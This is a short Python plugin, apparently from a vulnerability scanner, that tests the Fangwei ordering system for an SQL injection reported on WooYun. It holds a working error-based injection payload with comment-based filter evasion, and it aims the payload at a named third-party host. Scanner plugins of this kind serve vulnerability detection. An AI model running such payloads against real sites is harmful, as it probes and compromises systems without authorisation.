#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = yongshao
#_PlugName_ = 方维订餐系统某处存在SQL注射
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0135111
import re
def assign(service, arg):
    if service == 'fangwei':
        return True, arg

def audit(arg):
    payload = 'shop.php?ctl=index&act=ajax_purpose_store&purpose_id=1%20and%20(select/**/%201%20from/**/%20(select/**/%20count(*),concat(md5(123),floor(rand(0)*2))x%20from/**/%20information_schema.tables%20group%20by%20x)a)#'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and "202cb962ac59075b964b07152d234b701" in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('fangwei', 'http://dc.816go.com/')[1])